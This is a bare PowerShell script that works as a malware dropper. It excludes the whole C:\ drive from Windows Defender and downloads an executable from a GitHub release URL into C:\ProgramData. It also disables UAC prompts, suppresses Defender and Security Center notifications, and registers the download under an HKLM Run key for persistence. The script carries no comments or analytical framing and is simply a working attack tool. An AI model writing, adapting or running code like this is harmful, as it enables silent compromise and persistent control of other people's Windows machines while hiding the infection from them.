$defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
if (!(Test-Path $defenderPath)) {
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /f /reg:64
}
$exclusionExists = Get-ItemProperty -Path $defenderPath -Name "C:\" -ErrorAction SilentlyContinue
if (!$exclusionExists) {
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /d 0 /f /reg:64
}




$filePath1 = "C:\ProgramData\SOMEEXENAME.exe"
$url1 = "https://github.com/alexandrahollenbeck1929-star/test/releases/download/hihi/WindowsService.exe"

if (!(Test-Path $filePath1)) {
    Remove-Item -Path $filePath1 -Force -ErrorAction SilentlyContinue
    Invoke-WebRequest -Uri $url1 -UseBasicParsing -OutFile $filePath1
}

$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacValue = Get-ItemProperty -Path $uacPath -Name "EnableLUA" -ErrorAction SilentlyContinue
if ($uacValue.EnableLUA -ne 0) {
    Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
}

$notifyValue = Get-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue
if ($notifyValue.ConsentPromptBehaviorAdmin -ne 0) {
    Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
}

$defenderNotifyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"
if (!(Test-Path $defenderNotifyPath)) {
    New-Item -Path $defenderNotifyPath -Force -ErrorAction SilentlyContinue | Out-Null
}
Set-ItemProperty -Path $defenderNotifyPath -Name "Notification_Suppress" -Value 1 -Force -ErrorAction SilentlyContinue

$defenderReportingPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting"
if (!(Test-Path $defenderReportingPath)) {
    New-Item -Path $defenderReportingPath -Force -ErrorAction SilentlyContinue | Out-Null
}
Set-ItemProperty -Path $defenderReportingPath -Name "DisableEnhancedNotifications" -Value 1 -Force -ErrorAction SilentlyContinue

$securityCenterPath = "HKLM:\SOFTWARE\Microsoft\Security Center\Svc"
if (Test-Path $securityCenterPath) {
    Set-ItemProperty -Path $securityCenterPath -Name "AntiVirusDisableNotify" -Value 1 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $securityCenterPath -Name "FirewallDisableNotify" -Value 1 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $securityCenterPath -Name "UpdatesDisableNotify" -Value 1 -Force -ErrorAction SilentlyContinue
}

$runKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
$runEntryExists = Get-ItemProperty -Path $runKey -Name "SOMENAME" -ErrorAction SilentlyContinue
if (!$runEntryExists) {
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SOMENAME"" /t REG_SZ /d "$filePath1" /f
}
